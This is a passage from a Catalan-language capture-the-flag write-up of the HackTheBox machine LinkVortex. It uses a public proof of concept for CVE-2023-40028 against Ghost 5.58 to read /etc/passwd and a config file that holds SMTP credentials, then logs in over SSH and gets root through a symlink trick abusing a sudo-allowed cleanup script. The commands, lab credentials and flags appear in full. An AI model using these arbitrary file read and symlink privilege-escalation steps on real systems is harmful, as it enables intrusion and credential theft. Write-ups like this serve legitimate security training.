./ghost/admin/tests/acceptance/staff-test.js://             await fillIn('.fullscreen-modal input[name="email"]', 'admin@example.com');
./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [ownerRole]});
./ghost/core/test/e2e-api/admin/users.test.js:            user: testUtils.DataGenerator.forKnex.createUser({email: 'test+admin@ghost.org', slug: 'admin'}),
./yarn.lock:intersection-observer-admin@~0.3.2:
./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await modal.getByLabel('Email').fill('newadmin@test.com');
./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await expect(listItem.getByText('newadmin@test.com')).toBeVisible();
./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                email: 'newadmin@test.com',
./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
````

Ara aquestes credencials les provem al dashboard de ghost trobat a http://dev.linkvortex.htb/ghost:

![image](https://github.com/user-attachments/assets/8f0a6dcd-12db-4d1c-a784-dba667f40959)

Ara hem pogut per fi treure ús de les credencials i hem pogut accedir al dashboard de l'aplicació/programa Ghost. Ghost és un programa basat en NodeJS de gestió de continguts enfocat a blocs, amb multitud dintegracions i que permet una completa personalització de laspecte. En conjunt, és una solució que resulta molt amigable per a qualsevol desenvolupador. Però on realment destaca és el seu rendiment.

![image](https://github.com/user-attachments/assets/f3083692-6f3b-4977-b951-bc3aa700332e)

Ara estem al dashboard però no veiem res rellevant. Per tant, com que sabem quina tecnologia/eina utilitza la pàgina, que és Ghost (https://ghost.org/), si anem a veure el codi font podem veure'n la versió:

</script>

    <meta name="generator" content="Ghost 5.58">
    <link rel="alternate" type="application/rss+xml" title="BitByBit Hardware" href="http://linkvortex.htb/rss/">


Ara per tant, buscarem algun CVE o POC si és que en té que ens permeti accedir a la màquina. Sembla que he trobat un POC a un repositori de GitHub del CVE-2023-40028 que afecta a les versions de Ghost anteriors a la 5.59.1: https://github.com/0xyassine/CVE-2023-40028. El que fa aquest poc és "permetre als usuaris autenticats penjar fitxers que són enllaços simbòlics. Això es pot aprofitar per realitzar una lectura de fitxer arbitrari de qualsevol fitxer del sistema operatiu amfitrió. Es recomana que els administradors del lloc comprovin l'explotació d'aquest problema buscant enllaços simbòlics desconeguts dins del contingut/carpeta de Ghost. La versió 5.59.1 conté una solució per a aquest problema i no hi ha cap solució alternativa coneguda.". A més a més, complim amb els seus dos requeriments:

    Accés a una versió Ghost vulnerable (anterior a la 5.59.1)
    Compte d'usuari autenticat


Ja que el compte d'usuari autenticat ha de ser alguna de les dos contrasenyes que hem trobat abans.

Per tant, anem a provar què obtenim amb ell. Primer editem l'script i canviem el 127.0.0.1 per el nom de domini que tenim posat al nostre fitxer /etc/hosts: `GHOST_URL='http://linkvortex.htb'`.

Ara donem permisos d'execució a l'script i l'executem i el propi script ja ens diu com s'ha d'utilitzar:

````                                                                                                                                 
┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ nano CVE-2023-40028.sh 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ ./CVE-2023-40028.sh 
Usage: ./CVE-2023-40028.sh -u username -p password
````

I utilitzem l'script amb les credencials que hem accedit al dashboard de Ghost que ens permetrà accedir al fitxer del sistema que volem, com si féssim un cat:

````
┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> 
````
Per lògica, igual que a l'anterior màquina que vaig fer, l'Alert, miro d'extreure les dades del fitxer /etc/passwd per veure els usuaris i si fos el cas les contrasenyes que tenen en el servidor però no trobo res rellevant:
````
┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
file> 
````

Anirem a internet a veure si trobem on hi ha els fitxers de configuració per defecte de Ghost. Un cop feta la cerca, he trobat que hem de buscar el fitxer `config.production.json` i allà és molt probable que trobem les credencials per connectar amb una base de dades o bé les credencials per enviament de correus podent trobar les credencials també. Aquesta informació l'he tret de la documentació oficial de Ghost https://ghost.org/docs/config/ :

![image](https://github.com/user-attachments/assets/69743cae-6505-444a-891e-d48dd19d7d70)

![image](https://github.com/user-attachments/assets/5dbd183a-4ab7-4348-ace4-8cef0042feea)

Per tant la clau és trobar aquest fitxer, ara per tant a veure si trobem a internet a quin directori per defecte es troba. A internet he vist que podria estar aquí però no ha funcionat :
```
file> /var/www/ghost/config.production.json       
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
file> 

```

He seguit buscant i he trobat a un repositori de GitHub que en un docker està a la ruta ``/var/lib/ghost/content`` la configuració, per tant he buscat aquí o bé a /var/lib/ghost/ i hi ha hagut més sort:

```
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
file> 

```

Ara ja tenim unes credencials d'usuari amb el seu nom i contrasenya que utilitzarem per connectar-nos, ara sí, per ssh:

```
┌──(kali㉿kali)-[~]
└─$ ssh bob@linkvortex.htb                       
The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Dec 22 08:16:25 2024 from 10.10.16.40
bob@linkvortex:~$ 
```

Ara obtenim la user flag:

```
bob@linkvortex:~$ whoami
bob
bob@linkvortex:~$ ls -lah
total 28K
drwxr-x--- 3 bob  bob  4.0K Dec 22 08:19 .
drwxr-xr-x 3 root root 4.0K Nov 30 10:07 ..
lrwxrwxrwx 1 root root    9 Apr  1  2024 .bash_history -> /dev/null
-rw-r--r-- 1 bob  bob   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 bob  bob  3.7K Jan  6  2022 .bashrc
drwx------ 2 bob  bob  4.0K Nov  1 08:40 .cache
-rw-r--r-- 1 bob  bob   807 Jan  6  2022 .profile
lrwxrwxrwx 1 bob  bob    14 Dec 22 08:19 hyh.txt -> /root/root.txt
-rw-r----- 1 root bob    33 Dec 22 07:23 user.txt
bob@linkvortex:~$ cat user.txt 
c0cc57ae11b3e5c9f1f24c8bc676b7c8
```

Ara el següent pas és escalar privilegis per poder obtenir la flag de root. Mirem el que l'usuari bob pot fer amb privilegis de root:

```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
bob@linkvortex:~$ 
```

Veiem que l'script **`/opt/ghost/clean_symlink.sh`** es pot executar com a root amb qualsevol fitxer amb extensió `.png` i sense necessitat d'introduir una contrasenya. Per tant sembla clar que és això el que hem d'explotar.

Creearem un enllaç símbolic que és com un "accés directe". És un fitxer que apunta a un altre fitxer o directori i amb això el que farem és "enganyar" perquè es treballi amb un fitxer diferent del que s'esperen. Això ho fem creant un enllaç simbòlic a `root.txt` que es troba al directori `/root` (com sempre a HTB), accessible només per l'usuari **root**. La comanda per fer-ho i que crea un enllaç simbòlic anomenat `wizard.txt` que apunta al fitxer `root.txt`.:

`bob@linkvortex:~$ ln -s /root/root.txt wizard.txt
`

Ara toca convertir wizard.txt en un fitxer .png ja que la vulnerabilitat de l'script permet executar-lo amb qualsevol fitxer .png, per tant creem un altre enllaç simbòlic que associa `wizard.txt` amb un fitxer `.png`:

`bob@linkvortex:~$ ln -s /home/bob/wizard.txt wizard.png
`
Ara toca executar l'script vulnerable que  executa l'script amb permisos de root i li passa wizard.png com a argument i com que wizard.png apunta indirectament a `/root/root.txt`, l'script processa el contingut de root.txt com si fos un fitxer .png i  l'execució de l'script ens permet veureel contingut del fitxer root.txt, que conté la root flag:

```
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/wizard.png
Link found [ /home/bob/wizard.png ] , moving it to quarantine
Content:
e579d593e27565a1ce2039b9e85e53ae
```

I ja tenim al root flag!!

Fent un repàs i com a conclusions, veiem que aquest atac funciona per dues raons principals:

-Manca de validacions a l'script:

- L'script no comprova que el fitxer `.png` sigui realment un fitxer d'imatge.
- Això permet utilitzar enllaços simbòlics per enganyar-lo.

-Permisos inadequats:

- L'usuari bob pot executar l'script amb privilegis de root sense contrasenya, cosa que li permet accedir a fitxers restringits.

